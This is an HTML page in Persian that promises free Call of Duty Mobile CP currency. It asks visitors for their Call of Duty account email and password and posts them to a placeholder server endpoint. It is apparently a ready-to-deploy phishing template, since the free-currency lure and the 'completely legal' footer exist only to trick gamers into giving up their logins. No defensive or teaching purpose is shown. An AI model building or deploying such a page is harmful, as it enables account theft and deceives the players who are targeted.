<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>CP رایگان کالاف دیوتی موبایل</title>
  <style>
    body {
      background-color: #000;
      background-image: url('https://wallpapercave.com/wp/wp5221689.jpg'); /* بکگراند جدید شلوغ‌تر */
      background-repeat: no-repeat;
      background-attachment: fixed;
      background-position: center;
      background-size: cover;
      font-family: 'Vazir', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      color: white;
    }
    .container {
      background: rgba(0, 0, 0, 0.8);
      padding: 40px 30px;
      border-radius: 20px;
      text-align: center;
      box-shadow: 0 0 30px #00ffcc, 0 0 20px #ff0066;
      width: 90%;
      max-width: 450px;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 30px;
      color: #00ffcc;
      text-shadow: 0 0 5px #00ffcc, 0 0 10px #ff0066;
    }
    input, select {
      width: 90%;
      padding: 12px;
      margin: 12px 0;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      background: #222;
      color: white;
    }
    select option {
      background: #111;
      color: white;
    }
    button {
      margin-top: 20px;
      padding: 14px 22px;
      background-color: #00ffcc;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      color: black;
      cursor: pointer;
      transition: background 0.3s, transform 0.3s;
    }
    button:hover {
      background-color: #00ccaa;
      transform: scale(1.05);
    }
    .note {
      font-size: 14px;
      margin-top: 20px;
      color: #aaa;
      margin-bottom: 10px;
    }
    .footer {
      margin-top: 10px;
      font-size: 13px;
      color: #55ff55;
      text-shadow: 0 0 5px #55ff55;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>CP رایگان کالاف دیوتی موبایل</h1>
    <form action="your-server-endpoint" method="POST">
      <input type="email" name="email" placeholder="ایمیل کالاف دیوتی" required><br>
      <input type="password" name="password" placeholder="رمز عبور اکانت" required><br>
      
      <select name="cp_amount" required>
        <option value="">مقدار سی‌پی دریافتی</option>
        <option value="500">500 CP</option>
        <option value="1000">1000 CP</option>
        <option value="2400">2400 CP</option>
        <option value="5000">5000 CP</option>
      </select><br>

      <button type="submit">دریافت CP</button>
    </form>

    <div class="note">
      لطفاً اطلاعات صحیح وارد کنید تا عملیات بدون مشکل انجام شود.
    </div>

    <div class="footer">
      CP کاملا قانونی واریز میشود.
    </div>
  </div>

</body>
</html>
